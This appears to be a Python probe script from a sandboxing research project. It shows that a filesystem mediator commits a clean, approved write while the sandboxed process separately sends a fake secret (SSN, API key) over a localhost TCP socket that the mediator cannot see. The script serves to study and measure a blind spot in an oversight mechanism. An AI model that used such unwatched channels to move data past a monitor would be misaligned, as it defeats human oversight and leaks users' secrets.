"""
Runs INSIDE the container, as root: M4, third attack family --
unmediated-channel exfiltration, named in `25-research-program.md`
section 3.1 as an ARGUED limitation ("network bytes... anything inside
TLS" is outside what a filesystem boundary can see) but never
demonstrated on this project's own mediator until now.

SELF-CONTAINED BY DESIGN: no external network access is used or needed.
A plain TCP listener is started on localhost, inside this same
container, by the trusted (root) side -- standing in for "any channel
the mediator does not watch." The untrusted server (as `sandbox`) is
told to do two things: perform the approved, honest file write (which
the M2 mediator watches and would correctly commit), AND separately open
a socket to the local listener and send a payload that never touches the
filesystem at all.

PREDICTION, stated before running it: the M2 mediator, which only reads
`staging`, sees a perfectly clean, correctly-committed honest write --
and has no way to know anything was also sent over the socket, because
nothing about that channel is in its observation surface. This is
`25-research-program.md` section 3.1's own claim ("what the boundary can
see" vs "what it cannot thereby know"), made concrete rather than only
argued.

NOT A DEFENSE TEST: this probe measures what escapes, not what would
stop it. No fix is attempted here -- a real fix (e.g. network-namespace
confinement, an egress allowlist) is a different mechanism than the
filesystem mediator this whole project has built, and is explicitly out
of scope for a probe about the CURRENT mechanism's blind spot.
"""

from __future__ import annotations

import json
import os
import pwd
import shutil
import socket
import subprocess
import sys
import threading
import time
from pathlib import Path

STAGING = Path("/staging_channel")
COMMITTED = Path("/committed_channel")
SERVER_USER = "sandbox"
APPROVED_PATH = "report.txt"
APPROVED_CONTENT = "quarterly numbers"
SECRET_PAYLOAD = "SSN 123-45-6789, api_key=sk-exfiltrated-secret"
LISTEN_PORT = 8765


def reset_dir(path: Path, uid, gid, mode: int) -> None:
    if path.exists():
        shutil.rmtree(path)
    path.mkdir(parents=True)
    if uid is not None:
        os.chown(path, uid, gid)
    os.chmod(path, mode)


def observe(root: Path) -> dict:
    out = {}
    for p in sorted(root.rglob("*")):
        if p.is_file() and not p.is_symlink():
            out[str(p.relative_to(root))] = p.read_text(encoding="utf-8", errors="replace")
    return out


def run_listener(received: list) -> None:
    """Trusted side: a plain local listener. Anything the untrusted
    server sends here never touches the filesystem the mediator watches."""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", LISTEN_PORT))
    srv.listen(1)
    srv.settimeout(5)
    try:
        conn, _ = srv.accept()
        with conn:
            data = conn.recv(4096)
            received.append(data.decode("utf-8", errors="replace"))
    except socket.timeout:
        received.append(None)
    finally:
        srv.close()


def start_server_and_exfiltrate() -> dict:
    rec = pwd.getpwnam(SERVER_USER)

    script = f'''
import os, socket, sys
os.setgid({rec.pw_gid})
os.setuid({rec.pw_uid})

# The approved, honest write -- exactly what the mediator watches.
with open("{STAGING / APPROVED_PATH}", "w") as f:
    f.write({APPROVED_CONTENT!r})

# The unmediated channel -- a plain socket, never touches "staging".
attempted = "not attempted"
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", {LISTEN_PORT}))
    s.sendall({SECRET_PAYLOAD!r}.encode())
    s.close()
    attempted = "sent"
except Exception as e:
    attempted = f"failed: {{type(e).__name__}}: {{e}}"

print(attempted)
'''
    proc = subprocess.run([sys.executable, "-c", script], capture_output=True, text=True, timeout=10)
    return {"server_stdout": proc.stdout.strip(), "server_stderr": proc.stderr.strip()[-300:]}


def mediate() -> dict:
    staged = observe(STAGING)
    matches = staged.get(APPROVED_PATH) == APPROVED_CONTENT and set(staged) <= {APPROVED_PATH}
    decision = "discard"
    if matches:
        decision = "commit"
        (COMMITTED / APPROVED_PATH).write_text(staged[APPROVED_PATH], encoding="utf-8")
    return {"staged": staged, "decision": decision,
            "mediator_saw_anything_unusual": not matches}


def main() -> None:
    rec = pwd.getpwnam(SERVER_USER)
    reset_dir(STAGING, rec.pw_uid, rec.pw_gid, 0o700)
    reset_dir(COMMITTED, 0, 0, 0o755)

    received: list = []
    listener = threading.Thread(target=run_listener, args=(received,), daemon=True)
    listener.start()
    time.sleep(0.2)   # let the listener bind before the server tries to connect

    server_result = start_server_and_exfiltrate()
    listener.join(timeout=6)

    mediator_result = mediate()

    exfiltrated = received[0] if received else None
    print(json.dumps({
        "server_result": server_result,
        "secret_actually_received_by_listener": exfiltrated,
        "exfiltration_succeeded": exfiltrated == SECRET_PAYLOAD,
        "mediator_result": mediator_result,
        "mediator_was_oblivious": (
            mediator_result["decision"] == "commit"
            and not mediator_result["mediator_saw_anything_unusual"]
        ),
    }, indent=1))


if __name__ == "__main__":
    main()
